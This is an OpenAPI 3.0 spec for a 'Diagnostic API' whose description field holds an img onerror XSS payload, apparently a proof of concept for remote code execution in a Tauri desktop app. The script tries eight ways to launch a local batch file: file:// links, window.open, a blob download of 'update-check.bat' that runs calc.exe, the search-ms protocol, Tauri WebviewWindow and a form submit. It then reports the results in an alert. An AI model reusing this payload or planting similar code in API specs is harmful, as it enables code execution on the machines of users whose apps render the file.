openapi: "3.0.0"
info:
  title: "Diagnostic API"
  version: "1.0.0"
  description: |
    RCE test.
    <img src=x onerror="(function(){var t=window.__TAURI__;if(!t)return;var r=['=== RCE TEST (Part 6: DOM exec + file:// + blob + WebviewWindow) ===',''];var tests=[];var i=0;function add(n,f){tests.push([n,f])}function next(){if(i>=tests.length){alert(r.join('\n'));return}var name=tests[i][0];var fn=tests[i][1];i++;r.push('['+i+'] '+name);try{fn().then(function(v){r.push('  -> OK: '+JSON.stringify(v).substring(0,250))}).catch(function(e){r.push('  -> FAIL: '+String(e).substring(0,150))}).then(function(){next()})}catch(e){r.push('  -> ERR: '+String(e).substring(0,150));next()}}var batPath='C:\\Users\\Juan_\\OneDrive\\Documents\\poc-test.bat';r.push('Target .bat: '+batPath);r.push('');add('1: anchor click file:// to .bat',function(){return new Promise(function(ok){var a=document.createElement('a');a.href='file:///'+batPath.replace(/\\/g,'/');a.style.display='none';document.body.appendChild(a);r.push('  href: '+a.href);a.click();setTimeout(function(){ok('click sent')},500)})});add('2: anchor click+target=_blank file://',function(){return new Promise(function(ok){var a=document.createElement('a');a.href='file:///'+batPath.replace(/\\/g,'/');a.target='_blank';a.style.display='none';document.body.appendChild(a);a.click();setTimeout(function(){ok('click _blank sent')},500)})});add('3: window.open file://',function(){return new Promise(function(ok){var w=window.open('file:///'+batPath.replace(/\\/g,'/'));r.push('  window.open returned: '+(w?'window object':'null'));ok(w?'window opened':'null returned')})});add('4: blob download .bat',function(){return new Promise(function(ok){var b=new Blob(['@echo off\r\ncalc.exe\r\n'],{type:'application/x-msdos-program'});var u=URL.createObjectURL(b);var a=document.createElement('a');a.href=u;a.download='update-check.bat';document.body.appendChild(a);a.click();r.push('  blob URL: '+u.substring(0,60));setTimeout(function(){ok('download triggered')},500)})});add('5: search-ms protocol anchor',function(){return new Promise(function(ok){var a=document.createElement('a');a.href='search-ms:query=poc-test.bat&crumb=location:C%3A%5CUsers%5CJuan_%5COneDrive%5CDocuments';a.style.display='none';document.body.appendChild(a);a.click();setTimeout(function(){ok('search-ms click sent')},1000)})});add('6: WebviewWindow file://',function(){try{var W=t.window.WebviewWindow;r.push('  WebviewWindow type: '+typeof W);if(typeof W==='function'){var w=new W('poc',{url:'file:///'+batPath.replace(/\\/g,'/')});return Promise.resolve('WebviewWindow created: '+typeof w)}return Promise.resolve('WebviewWindow not a constructor')}catch(e){return Promise.reject(e)}});add('7: WebviewWindow http localhost',function(){try{var W=t.window.WebviewWindow;if(typeof W==='function'){var w=new W('poc2',{url:'http://127.0.0.1:8888/plugin.yaml'});return Promise.resolve('window created')}return Promise.resolve('N/A')}catch(e){return Promise.reject(e)}});add('8: form submit file://',function(){return new Promise(function(ok){var f=document.createElement('form');f.action='file:///'+batPath.replace(/\\/g,'/');f.method='GET';f.target='_blank';f.style.display='none';document.body.appendChild(f);f.submit();setTimeout(function(){ok('form submitted')},500)})});next()})()">
servers:
  - url: "https://api.example.com/v1"
paths:
  /test:
    get:
      operationId: runTest
      summary: "Run test"
      parameters:
        - name: id
          in: query
          required: true
          schema:
            type: string
      responses:
        "200":
          description: "OK"
          content:
            application/json:
              schema:
                type: object
                properties:
                  status:
                    type: string
